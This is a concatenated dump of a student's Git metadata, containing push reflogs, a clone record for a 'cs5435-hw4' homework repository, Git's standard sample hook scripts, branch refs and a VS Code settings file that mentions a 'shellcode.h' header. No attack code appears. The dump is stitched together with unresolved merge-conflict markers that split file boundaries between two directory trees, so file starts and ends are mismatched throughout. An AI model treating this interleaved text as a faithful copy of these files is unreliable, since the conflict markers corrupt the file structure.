5c2cb67d944547ff89fa9cd3af12aadf6ac24ac5 e69e4f07d06807af8a9b328575fafbefd0164919 justinhalford <justinhalford@gmail.com> 1715016532 -0400	update by push
e69e4f07d06807af8a9b328575fafbefd0164919 be661a53accefcad2a4ccf683759860a7c0e83cf justinhalford <justinhalford@gmail.com> 1715016690 -0400	update by push
be661a53accefcad2a4ccf683759860a7c0e83cf 0ead936ebafd7795a40e11511f3c87d7b3e2c0bb justinhalford <justinhalford@gmail.com> 1715019568 -0400	update by push
0ead936ebafd7795a40e11511f3c87d7b3e2c0bb 8866a60015970bbf8cc7a884487e030428bb666d justinhalford <justinhalford@gmail.com> 1715021266 -0400	update by push
8866a60015970bbf8cc7a884487e030428bb666d c575aedc80a89c74617fe4043901019959b436ee justinhalford <justinhalford@gmail.com> 1715021730 -0400	update by push
c575aedc80a89c74617fe4043901019959b436ee d6d9ca779038a7bcf8e6ecea0d80417979614157 justinhalford <justinhalford@gmail.com> 1715023572 -0400	update by push
d6d9ca779038a7bcf8e6ecea0d80417979614157 f5a13a9c89f03d2dfbdcd958ab249a1de49c7ed1 justinhalford <justinhalford@gmail.com> 1715024034 -0400	update by push
f5a13a9c89f03d2dfbdcd958ab249a1de49c7ed1 75ea162102c5fc3d80b5eefc5b6a1f67243158a9 justinhalford <justinhalford@gmail.com> 1715024055 -0400	update by push
75ea162102c5fc3d80b5eefc5b6a1f67243158a9 dd60aad429ef623ef5c854d1ac3f70cb756a5263 justinhalford <justinhalford@gmail.com> 1715024084 -0400	update by push
dd60aad429ef623ef5c854d1ac3f70cb756a5263 20f09b8f35d5f8e5eb77adbf1e036a1c188b2f46 justinhalford <justinhalford@gmail.com> 1715024299 -0400	update by push
20f09b8f35d5f8e5eb77adbf1e036a1c188b2f46 5e35e7014c44c0918edf9ee8ddecf50852639cb1 justinhalford <justinhalford@gmail.com> 1715025385 -0400	update by push
5e35e7014c44c0918edf9ee8ddecf50852639cb1 aa4953b5c0e5027e2b75c51a124dd26dda50cb52 justinhalford <justinhalford@gmail.com> 1715026919 -0400	update by push
aa4953b5c0e5027e2b75c51a124dd26dda50cb52 a34b1b99ba7376912bf8ff020ee241a9bee01e96 justinhalford <justinhalford@gmail.com> 1715030532 -0400	update by push
a34b1b99ba7376912bf8ff020ee241a9bee01e96 5191deaeac129aae17f44ea21eabee45374b5f46 justinhalford <justinhalford@gmail.com> 1715030770 -0400	update by push
5191deaeac129aae17f44ea21eabee45374b5f46 f505801a479543ea8c9900f8999dcfbc74fdce55 justinhalford <justinhalford@gmail.com> 1715031384 -0400	update by push
f505801a479543ea8c9900f8999dcfbc74fdce55 9852249ec46a55efc57f79d9c61b6b2b8c741894 justinhalford <justinhalford@gmail.com> 1715031503 -0400	update by push
9852249ec46a55efc57f79d9c61b6b2b8c741894 a6339781ec9385ea94f7f7e098b73ee2776c5cf9 justinhalford <justinhalford@gmail.com> 1715031567 -0400	update by push

<END OF ./.git/logs/refs/remotes/origin/master>
<START OF ./.git/logs/refs/remotes/origin/main>
0000000000000000000000000000000000000000 5eef708ef223be75f74e68d36cedffcf5484f284 justinhalford <justinhalford@gmail.com> 1712899483 -0400	update by push
5eef708ef223be75f74e68d36cedffcf5484f284 f8d27309725087299c0ae9fb6636d57984bed39c justinhalford <justinhalford@gmail.com> 1712902050 -0400	update by push
f8d27309725087299c0ae9fb6636d57984bed39c cb508fcc3161dd36de158d7f2fdc6934da4be6c5 justinhalford <justinhalford@gmail.com> 1713753703 -0400	update by push
cb508fcc3161dd36de158d7f2fdc6934da4be6c5 dfee827ec55600fc073f826ec2c0ed764ed192ed justinhalford <justinhalford@gmail.com> 1714700350 -0400	update by push
dfee827ec55600fc073f826ec2c0ed764ed192ed 8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3 justinhalford <justinhalford@gmail.com> 1714701281 -0400	update by push

<END OF ./.git/logs/refs/remotes/origin/main>
<START OF ./.git/hooks/commit-msg.sample>
=======
<END OF ./cs5435-hw4/.git/info/exclude>
<START OF ./cs5435-hw4/.git/logs/HEAD>
0000000000000000000000000000000000000000 df3e909cf32de4118129cbdd47846a73eeb2c36c justinhalford <justinhalford@gmail.com> 1715021445 -0400	clone: from https://github.com/cs5435/cs5435-hw4.git

<END OF ./cs5435-hw4/.git/logs/HEAD>
<START OF ./cs5435-hw4/.git/logs/refs/heads/master>
0000000000000000000000000000000000000000 df3e909cf32de4118129cbdd47846a73eeb2c36c justinhalford <justinhalford@gmail.com> 1715021445 -0400	clone: from https://github.com/cs5435/cs5435-hw4.git

<END OF ./cs5435-hw4/.git/logs/refs/heads/master>
<START OF ./cs5435-hw4/.git/logs/refs/remotes/origin/HEAD>
0000000000000000000000000000000000000000 df3e909cf32de4118129cbdd47846a73eeb2c36c justinhalford <justinhalford@gmail.com> 1715021445 -0400	clone: from https://github.com/cs5435/cs5435-hw4.git

<END OF ./cs5435-hw4/.git/logs/refs/remotes/origin/HEAD>
<START OF ./cs5435-hw4/.git/hooks/commit-msg.sample>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
#!/bin/sh
#
# An example hook script to check the commit log message.
# Called by "git commit" with one argument, the name of the file
# that has the commit message.  The hook should exit with non-zero
# status after issuing an appropriate message if it wants to stop the
# commit.  The hook is allowed to edit the commit message file.
#
# To enable this hook, rename this file to "commit-msg".

# Uncomment the below to add a Signed-off-by line to the message.
# Doing this in a hook is a bad idea in general, but the prepare-commit-msg
# hook is more suited to it.
#
# SOB=$(git var GIT_AUTHOR_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# grep -qs "^$SOB" "$1" || echo "$SOB" >> "$1"

# This example catches duplicate Signed-off-by lines.

test "" = "$(grep '^Signed-off-by: ' "$1" |
	 sort | uniq -c | sed -e '/^[ 	]*1[ 	]/d')" || {
	echo >&2 Duplicate Signed-off-by lines.
	exit 1
}

<<<<<<< HEAD
<END OF ./.git/hooks/commit-msg.sample>
<START OF ./.git/hooks/pre-rebase.sample>
=======
<END OF ./cs5435-hw4/.git/hooks/commit-msg.sample>
<START OF ./cs5435-hw4/.git/hooks/pre-rebase.sample>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
#!/bin/sh
#
# Copyright (c) 2006, 2008 Junio C Hamano
#
# The "pre-rebase" hook is run just before "git rebase" starts doing
# its job, and can prevent the command from running by exiting with
# non-zero status.
#
# The hook is called with the following parameters:
#
# $1 -- the upstream the series was forked from.
# $2 -- the branch being rebased (or empty when rebasing the current branch).
#
# This sample shows how to prevent topic branches that are already
# merged to 'next' branch from getting rebased, because allowing it
# would result in rebasing already published history.

publish=next
basebranch="$1"
if test "$#" = 2
then
	topic="refs/heads/$2"
else
	topic=`git symbolic-ref HEAD` ||
	exit 0 ;# we do not interrupt rebasing detached HEAD
fi

case "$topic" in
refs/heads/??/*)
	;;
*)
	exit 0 ;# we do not interrupt others.
	;;
esac

# Now we are dealing with a topic branch being rebased
# on top of master.  Is it OK to rebase it?

# Does the topic really exist?
git show-ref -q "$topic" || {
	echo >&2 "No such branch $topic"
	exit 1
}

# Is topic fully merged to master?
not_in_master=`git rev-list --pretty=oneline ^master "$topic"`
if test -z "$not_in_master"
then
	echo >&2 "$topic is fully merged to master; better remove it."
	exit 1 ;# we could allow it, but there is no point.
fi

# Is topic ever merged to next?  If so you should not be rebasing it.
only_next_1=`git rev-list ^master "^$topic" ${publish} | sort`
only_next_2=`git rev-list ^master           ${publish} | sort`
if test "$only_next_1" = "$only_next_2"
then
	not_in_topic=`git rev-list "^$topic" master`
	if test -z "$not_in_topic"
	then
		echo >&2 "$topic is already up to date with master"
		exit 1 ;# we could allow it, but there is no point.
	else
		exit 0
	fi
else
	not_in_next=`git rev-list --pretty=oneline ^${publish} "$topic"`
	/usr/bin/perl -e '
		my $topic = $ARGV[0];
		my $msg = "* $topic has commits already merged to public branch:\n";
		my (%not_in_next) = map {
			/^([0-9a-f]+) /;
			($1 => 1);
		} split(/\n/, $ARGV[1]);
		for my $elem (map {
				/^([0-9a-f]+) (.*)$/;
				[$1 => $2];
			} split(/\n/, $ARGV[2])) {
			if (!exists $not_in_next{$elem->[0]}) {
				if ($msg) {
					print STDERR $msg;
					undef $msg;
				}
				print STDERR " $elem->[1]\n";
			}
		}
	' "$topic" "$not_in_next" "$not_in_master"
	exit 1
fi

<<\DOC_END

This sample hook safeguards topic branches that have been
published from being rewound.

The workflow assumed here is:

 * Once a topic branch forks from "master", "master" is never
   merged into it again (either directly or indirectly).

 * Once a topic branch is fully cooked and merged into "master",
   it is deleted.  If you need to build on top of it to correct
   earlier mistakes, a new topic branch is created by forking at
   the tip of the "master".  This is not strictly necessary, but
   it makes it easier to keep your history simple.

 * Whenever you need to test or publish your changes to topic
   branches, merge them into "next" branch.

The script, being an example, hardcodes the publish branch name
to be "next", but it is trivial to make it configurable via
$GIT_DIR/config mechanism.

With this workflow, you would want to know:

(1) ... if a topic branch has ever been merged to "next".  Young
    topic branches can have stupid mistakes you would rather
    clean up before publishing, and things that have not been
    merged into other branches can be easily rebased without
    affecting other people.  But once it is published, you would
    not want to rewind it.

(2) ... if a topic branch has been fully merged to "master".
    Then you can delete it.  More importantly, you should not
    build on top of it -- other people may already want to
    change things related to the topic as patches against your
    "master", so if you need further changes, it is better to
    fork the topic (perhaps with the same name) afresh from the
    tip of "master".

Let's look at this example:

		   o---o---o---o---o---o---o---o---o---o "next"
		  /       /           /           /
		 /   a---a---b A     /           /
		/   /               /           /
	       /   /   c---c---c---c B         /
	      /   /   /             \         /
	     /   /   /   b---b C     \       /
	    /   /   /   /             \     /
    ---o---o---o---o---o---o---o---o---o---o---o "master"


A, B and C are topic branches.

 * A has one fix since it was merged up to "next".

 * B has finished.  It has been fully merged up to "master" and "next",
   and is ready to be deleted.

 * C has not merged to "next" at all.

We would want to allow C to be rebased, refuse A, and encourage
B to be deleted.

To compute (1):

	git rev-list ^master ^topic next
	git rev-list ^master        next

	if these match, topic has not merged in next at all.

To compute (2):

	git rev-list master..topic

	if this is empty, it is fully merged to "master".

DOC_END

<<<<<<< HEAD
<END OF ./.git/hooks/pre-rebase.sample>
<START OF ./.git/hooks/pre-commit.sample>
=======
<END OF ./cs5435-hw4/.git/hooks/pre-rebase.sample>
<START OF ./cs5435-hw4/.git/hooks/pre-commit.sample>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git commit" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message if
# it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-commit".

if git rev-parse --verify HEAD >/dev/null 2>&1
then
	against=HEAD
else
	# Initial commit: diff against an empty tree object
	against=$(git hash-object -t tree /dev/null)
fi

# If you want to allow non-ASCII filenames set this variable to true.
allownonascii=$(git config --type=bool hooks.allownonascii)

# Redirect output to stderr.
exec 1>&2

# Cross platform projects tend to avoid non-ASCII filenames; prevent
# them from being added to the repository. We exploit the fact that the
# printable range starts at the space character and ends with tilde.
if [ "$allownonascii" != "true" ] &&
	# Note that the use of brackets around a tr range is ok here, (it's
	# even required, for portability to Solaris 10's /usr/bin/tr), since
	# the square bracket bytes happen to fall in the designated range.
	test $(git diff --cached --name-only --diff-filter=A -z $against |
	  LC_ALL=C tr -d '[ -~]\0' | wc -c) != 0
then
	cat <<\EOF
Error: Attempt to add a non-ASCII file name.

This can cause problems if you want to work with people on other platforms.

To be portable it is advisable to rename the file.

If you know what you are doing you can disable this check using:

  git config hooks.allownonascii true
EOF
	exit 1
fi

# If there are whitespace errors, print the offending file names and fail.
exec git diff-index --check --cached $against --

<<<<<<< HEAD
<END OF ./.git/hooks/pre-commit.sample>
<START OF ./.git/hooks/applypatch-msg.sample>
=======
<END OF ./cs5435-hw4/.git/hooks/pre-commit.sample>
<START OF ./cs5435-hw4/.git/hooks/applypatch-msg.sample>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
#!/bin/sh
#
# An example hook script to check the commit log message taken by
# applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.  The hook is
# allowed to edit the commit message file.
#
# To enable this hook, rename this file to "applypatch-msg".

. git-sh-setup
commitmsg="$(git rev-parse --git-path hooks/commit-msg)"
test -x "$commitmsg" && exec "$commitmsg" ${1+"$@"}
:

<<<<<<< HEAD
<END OF ./.git/hooks/applypatch-msg.sample>
<START OF ./.git/hooks/fsmonitor-watchman.sample>
=======
<END OF ./cs5435-hw4/.git/hooks/applypatch-msg.sample>
<START OF ./cs5435-hw4/.git/hooks/fsmonitor-watchman.sample>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
#!/usr/bin/perl

use strict;
use warnings;
use IPC::Open2;

# An example hook script to integrate Watchman
# (https://facebook.github.io/watchman/) with git to speed up detecting
# new and modified files.
#
# The hook is passed a version (currently 2) and last update token
# formatted as a string and outputs to stdout a new update token and
# all files that have been modified since the update token. Paths must
# be relative to the root of the working tree and separated by a single NUL.
#
# To enable this hook, rename this file to "query-watchman" and set
# 'git config core.fsmonitor .git/hooks/query-watchman'
#
my ($version, $last_update_token) = @ARGV;

# Uncomment for debugging
# print STDERR "$0 $version $last_update_token\n";

# Check the hook interface version
if ($version ne 2) {
	die "Unsupported query-fsmonitor hook version '$version'.\n" .
	    "Falling back to scanning...\n";
}

my $git_work_tree = get_working_dir();

my $retry = 1;

my $json_pkg;
eval {
	require JSON::XS;
	$json_pkg = "JSON::XS";
	1;
} or do {
	require JSON::PP;
	$json_pkg = "JSON::PP";
};

launch_watchman();

sub launch_watchman {
	my $o = watchman_query();
	if (is_work_tree_watched($o)) {
		output_result($o->{clock}, @{$o->{files}});
	}
}

sub output_result {
	my ($clockid, @files) = @_;

	# Uncomment for debugging watchman output
	# open (my $fh, ">", ".git/watchman-output.out");
	# binmode $fh, ":utf8";
	# print $fh "$clockid\n@files\n";
	# close $fh;

	binmode STDOUT, ":utf8";
	print $clockid;
	print "\0";
	local $, = "\0";
	print @files;
}

sub watchman_clock {
	my $response = qx/watchman clock "$git_work_tree"/;
	die "Failed to get clock id on '$git_work_tree'.\n" .
		"Falling back to scanning...\n" if $? != 0;

	return $json_pkg->new->utf8->decode($response);
}

sub watchman_query {
	my $pid = open2(\*CHLD_OUT, \*CHLD_IN, 'watchman -j --no-pretty')
	or die "open2() failed: $!\n" .
	"Falling back to scanning...\n";

	# In the query expression below we're asking for names of files that
	# changed since $last_update_token but not from the .git folder.
	#
	# To accomplish this, we're using the "since" generator to use the
	# recency index to select candidate nodes and "fields" to limit the
	# output to file names only. Then we're using the "expression" term to
	# further constrain the results.
	if (substr($last_update_token, 0, 1) eq "c") {
		$last_update_token = "\"$last_update_token\"";
	}
	my $query = <<"	END";
		["query", "$git_work_tree", {
			"since": $last_update_token,
			"fields": ["name"],
			"expression": ["not", ["dirname", ".git"]]
		}]
	END

	# Uncomment for debugging the watchman query
	# open (my $fh, ">", ".git/watchman-query.json");
	# print $fh $query;
	# close $fh;

	print CHLD_IN $query;
	close CHLD_IN;
	my $response = do {local $/; <CHLD_OUT>};

	# Uncomment for debugging the watch response
	# open ($fh, ">", ".git/watchman-response.json");
	# print $fh $response;
	# close $fh;

	die "Watchman: command returned no output.\n" .
	"Falling back to scanning...\n" if $response eq "";
	die "Watchman: command returned invalid output: $response\n" .
	"Falling back to scanning...\n" unless $response =~ /^\{/;

	return $json_pkg->new->utf8->decode($response);
}

sub is_work_tree_watched {
	my ($output) = @_;
	my $error = $output->{error};
	if ($retry > 0 and $error and $error =~ m/unable to resolve root .* directory (.*) is not watched/) {
		$retry--;
		my $response = qx/watchman watch "$git_work_tree"/;
		die "Failed to make watchman watch '$git_work_tree'.\n" .
		    "Falling back to scanning...\n" if $? != 0;
		$output = $json_pkg->new->utf8->decode($response);
		$error = $output->{error};
		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		# Uncomment for debugging watchman output
		# open (my $fh, ">", ".git/watchman-output.out");
		# close $fh;

		# Watchman will always return all files on the first query so
		# return the fast "everything is dirty" flag to git and do the
		# Watchman query just to get it over with now so we won't pay
		# the cost in git to look up each individual file.
		my $o = watchman_clock();
		$error = $output->{error};

		die "Watchman: $error.\n" .
		"Falling back to scanning...\n" if $error;

		output_result($o->{clock}, ("/"));
		$last_update_token = $o->{clock};

		eval { launch_watchman() };
		return 0;
	}

	die "Watchman: $error.\n" .
	"Falling back to scanning...\n" if $error;

	return 1;
}

sub get_working_dir {
	my $working_dir;
	if ($^O =~ 'msys' || $^O =~ 'cygwin') {
		$working_dir = Win32::GetCwd();
		$working_dir =~ tr/\\/\//;
	} else {
		require Cwd;
		$working_dir = Cwd::cwd();
	}

	return $working_dir;
}

<<<<<<< HEAD
<END OF ./.git/hooks/fsmonitor-watchman.sample>
<START OF ./.git/hooks/pre-receive.sample>
=======
<END OF ./cs5435-hw4/.git/hooks/fsmonitor-watchman.sample>
<START OF ./cs5435-hw4/.git/hooks/pre-receive.sample>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
#!/bin/sh
#
# An example hook script to make use of push options.
# The example simply echoes all push options that start with 'echoback='
# and rejects all pushes when the "reject" push option is used.
#
# To enable this hook, rename this file to "pre-receive".

if test -n "$GIT_PUSH_OPTION_COUNT"
then
	i=0
	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
	do
		eval "value=\$GIT_PUSH_OPTION_$i"
		case "$value" in
		echoback=*)
			echo "echo from the pre-receive-hook: ${value#*=}" >&2
			;;
		reject)
			exit 1
		esac
		i=$((i + 1))
	done
fi

<<<<<<< HEAD
<END OF ./.git/hooks/pre-receive.sample>
<START OF ./.git/hooks/prepare-commit-msg.sample>
=======
<END OF ./cs5435-hw4/.git/hooks/pre-receive.sample>
<START OF ./cs5435-hw4/.git/hooks/prepare-commit-msg.sample>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
#!/bin/sh
#
# An example hook script to prepare the commit log message.
# Called by "git commit" with the name of the file that has the
# commit message, followed by the description of the commit
# message's source.  The hook's purpose is to edit the commit
# message file.  If the hook fails with a non-zero status,
# the commit is aborted.
#
# To enable this hook, rename this file to "prepare-commit-msg".

# This hook includes three examples. The first one removes the
# "# Please enter the commit message..." help message.
#
# The second includes the output of "git diff --name-status -r"
# into the message, just before the "git status" output.  It is
# commented because it doesn't cope with --amend or with squashed
# commits.
#
# The third example adds a Signed-off-by line to the message, that can
# still be edited.  This is rarely a good idea.

COMMIT_MSG_FILE=$1
COMMIT_SOURCE=$2
SHA1=$3

/usr/bin/perl -i.bak -ne 'print unless(m/^. Please enter the commit message/..m/^#$/)' "$COMMIT_MSG_FILE"

# case "$COMMIT_SOURCE,$SHA1" in
#  ,|template,)
#    /usr/bin/perl -i.bak -pe '
#       print "\n" . `git diff --cached --name-status -r`
# 	 if /^#/ && $first++ == 0' "$COMMIT_MSG_FILE" ;;
#  *) ;;
# esac

# SOB=$(git var GIT_COMMITTER_IDENT | sed -n 's/^\(.*>\).*$/Signed-off-by: \1/p')
# git interpret-trailers --in-place --trailer "$SOB" "$COMMIT_MSG_FILE"
# if test -z "$COMMIT_SOURCE"
# then
#   /usr/bin/perl -i.bak -pe 'print "\n" if !$first_line++' "$COMMIT_MSG_FILE"
# fi

<<<<<<< HEAD
<END OF ./.git/hooks/prepare-commit-msg.sample>
<START OF ./.git/hooks/post-update.sample>
=======
<END OF ./cs5435-hw4/.git/hooks/prepare-commit-msg.sample>
<START OF ./cs5435-hw4/.git/hooks/post-update.sample>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
#!/bin/sh
#
# An example hook script to prepare a packed repository for use over
# dumb transports.
#
# To enable this hook, rename this file to "post-update".

exec git update-server-info

<<<<<<< HEAD
<END OF ./.git/hooks/post-update.sample>
<START OF ./.git/hooks/pre-merge-commit.sample>
=======
<END OF ./cs5435-hw4/.git/hooks/post-update.sample>
<START OF ./cs5435-hw4/.git/hooks/pre-merge-commit.sample>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
#!/bin/sh
#
# An example hook script to verify what is about to be committed.
# Called by "git merge" with no arguments.  The hook should
# exit with non-zero status after issuing an appropriate message to
# stderr if it wants to stop the merge commit.
#
# To enable this hook, rename this file to "pre-merge-commit".

. git-sh-setup
test -x "$GIT_DIR/hooks/pre-commit" &&
        exec "$GIT_DIR/hooks/pre-commit"
:

<<<<<<< HEAD
<END OF ./.git/hooks/pre-merge-commit.sample>
<START OF ./.git/hooks/pre-applypatch.sample>
=======
<END OF ./cs5435-hw4/.git/hooks/pre-merge-commit.sample>
<START OF ./cs5435-hw4/.git/hooks/pre-applypatch.sample>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
#!/bin/sh
#
# An example hook script to verify what is about to be committed
# by applypatch from an e-mail message.
#
# The hook should exit with non-zero status after issuing an
# appropriate message if it wants to stop the commit.
#
# To enable this hook, rename this file to "pre-applypatch".

. git-sh-setup
precommit="$(git rev-parse --git-path hooks/pre-commit)"
test -x "$precommit" && exec "$precommit" ${1+"$@"}
:

<<<<<<< HEAD
<END OF ./.git/hooks/pre-applypatch.sample>
<START OF ./.git/hooks/pre-push.sample>
=======
<END OF ./cs5435-hw4/.git/hooks/pre-applypatch.sample>
<START OF ./cs5435-hw4/.git/hooks/pre-push.sample>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
#!/bin/sh

# An example hook script to verify what is about to be pushed.  Called by "git
# push" after it has checked the remote status, but before anything has been
# pushed.  If this script exits with a non-zero status nothing will be pushed.
#
# This hook is called with the following parameters:
#
# $1 -- Name of the remote to which the push is being done
# $2 -- URL to which the push is being done
#
# If pushing without using a named remote those arguments will be equal.
#
# Information about the commits which are being pushed is supplied as lines to
# the standard input in the form:
#
#   <local ref> <local sha1> <remote ref> <remote sha1>
#
# This sample shows how to prevent push of commits where the log message starts
# with "WIP" (work in progress).

remote="$1"
url="$2"

z40=0000000000000000000000000000000000000000

while read local_ref local_sha remote_ref remote_sha
do
	if [ "$local_sha" = $z40 ]
	then
		# Handle delete
		:
	else
		if [ "$remote_sha" = $z40 ]
		then
			# New branch, examine all commits
			range="$local_sha"
		else
			# Update to existing branch, examine new commits
			range="$remote_sha..$local_sha"
		fi

		# Check for WIP commit
		commit=`git rev-list -n 1 --grep '^WIP' "$range"`
		if [ -n "$commit" ]
		then
			echo >&2 "Found WIP commit in $local_ref, not pushing"
			exit 1
		fi
	fi
done

exit 0

<<<<<<< HEAD
<END OF ./.git/hooks/pre-push.sample>
<START OF ./.git/hooks/update.sample>
=======
<END OF ./cs5435-hw4/.git/hooks/pre-push.sample>
<START OF ./cs5435-hw4/.git/hooks/update.sample>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
#!/bin/sh
#
# An example hook script to block unannotated tags from entering.
# Called by "git receive-pack" with arguments: refname sha1-old sha1-new
#
# To enable this hook, rename this file to "update".
#
# Config
# ------
# hooks.allowunannotated
#   This boolean sets whether unannotated tags will be allowed into the
#   repository.  By default they won't be.
# hooks.allowdeletetag
#   This boolean sets whether deleting tags will be allowed in the
#   repository.  By default they won't be.
# hooks.allowmodifytag
#   This boolean sets whether a tag may be modified after creation. By default
#   it won't be.
# hooks.allowdeletebranch
#   This boolean sets whether deleting branches will be allowed in the
#   repository.  By default they won't be.
# hooks.denycreatebranch
#   This boolean sets whether remotely creating branches will be denied
#   in the repository.  By default this is allowed.
#

# --- Command line
refname="$1"
oldrev="$2"
newrev="$3"

# --- Safety check
if [ -z "$GIT_DIR" ]; then
	echo "Don't run this script from the command line." >&2
	echo " (if you want, you could supply GIT_DIR then run" >&2
	echo "  $0 <ref> <oldrev> <newrev>)" >&2
	exit 1
fi

if [ -z "$refname" -o -z "$oldrev" -o -z "$newrev" ]; then
	echo "usage: $0 <ref> <oldrev> <newrev>" >&2
	exit 1
fi

# --- Config
allowunannotated=$(git config --type=bool hooks.allowunannotated)
allowdeletebranch=$(git config --type=bool hooks.allowdeletebranch)
denycreatebranch=$(git config --type=bool hooks.denycreatebranch)
allowdeletetag=$(git config --type=bool hooks.allowdeletetag)
allowmodifytag=$(git config --type=bool hooks.allowmodifytag)

# check for no description
projectdesc=$(sed -e '1q' "$GIT_DIR/description")
case "$projectdesc" in
"Unnamed repository"* | "")
	echo "*** Project description file hasn't been set" >&2
	exit 1
	;;
esac

# --- Check types
# if $newrev is 0000...0000, it's a commit to delete a ref.
zero="0000000000000000000000000000000000000000"
if [ "$newrev" = "$zero" ]; then
	newrev_type=delete
else
	newrev_type=$(git cat-file -t $newrev)
fi

case "$refname","$newrev_type" in
	refs/tags/*,commit)
		# un-annotated tag
		short_refname=${refname##refs/tags/}
		if [ "$allowunannotated" != "true" ]; then
			echo "*** The un-annotated tag, $short_refname, is not allowed in this repository" >&2
			echo "*** Use 'git tag [ -a | -s ]' for tags you want to propagate." >&2
			exit 1
		fi
		;;
	refs/tags/*,delete)
		# delete tag
		if [ "$allowdeletetag" != "true" ]; then
			echo "*** Deleting a tag is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/tags/*,tag)
		# annotated tag
		if [ "$allowmodifytag" != "true" ] && git rev-parse $refname > /dev/null 2>&1
		then
			echo "*** Tag '$refname' already exists." >&2
			echo "*** Modifying a tag is not allowed in this repository." >&2
			exit 1
		fi
		;;
	refs/heads/*,commit)
		# branch
		if [ "$oldrev" = "$zero" -a "$denycreatebranch" = "true" ]; then
			echo "*** Creating a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/heads/*,delete)
		# delete branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	refs/remotes/*,commit)
		# tracking branch
		;;
	refs/remotes/*,delete)
		# delete tracking branch
		if [ "$allowdeletebranch" != "true" ]; then
			echo "*** Deleting a tracking branch is not allowed in this repository" >&2
			exit 1
		fi
		;;
	*)
		# Anything else (is there anything else?)
		echo "*** Update hook: unknown type of update to ref $refname of type $newrev_type" >&2
		exit 1
		;;
esac

# --- Finished
exit 0

<<<<<<< HEAD
<END OF ./.git/hooks/update.sample>
<START OF ./.git/refs/heads/master>
a6339781ec9385ea94f7f7e098b73ee2776c5cf9

<END OF ./.git/refs/heads/master>
<START OF ./.git/refs/heads/main>
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3

<END OF ./.git/refs/heads/main>
<START OF ./.git/refs/remotes/origin/master>
a6339781ec9385ea94f7f7e098b73ee2776c5cf9

<END OF ./.git/refs/remotes/origin/master>
<START OF ./.git/refs/remotes/origin/main>
8fe91943ed6def84c8a4a581ef70c7a8a2eac9a3

<END OF ./.git/refs/remotes/origin/main>
<START OF ./.vscode/settings.json>
{
  "files.associations": {
    "unistd.h": "c",
    "shellcode.h": "c"
  }
}
<END OF ./.vscode/settings.json>
=======
<END OF ./cs5435-hw4/.git/hooks/update.sample>
<START OF ./cs5435-hw4/.git/refs/heads/master>
df3e909cf32de4118129cbdd47846a73eeb2c36c

<END OF ./cs5435-hw4/.git/refs/heads/master>
<START OF ./cs5435-hw4/.git/refs/remotes/origin/HEAD>
ref: refs/remotes/origin/master

<END OF ./cs5435-hw4/.git/refs/remotes/origin/HEAD>
>>>>>>> b46bdcbb26373f24d6d15f907873a4de9e8aa6ce
